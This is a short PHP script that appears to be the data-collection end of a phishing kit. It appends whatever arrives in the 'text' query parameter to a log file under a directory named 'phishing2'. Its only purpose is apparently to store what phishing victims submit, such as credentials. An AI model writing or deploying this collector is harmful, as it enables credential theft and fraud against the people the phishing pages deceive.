<?php
$a = $_GET['text'];
// file_put_contents("/var/www/html/phishing2/logs/data.txt", $a,"a+");
$file = fopen("/var/www/html/phishing2/logs/data.txt", "a+");
fwrite($file,$a."\n");
fclose($file);
?>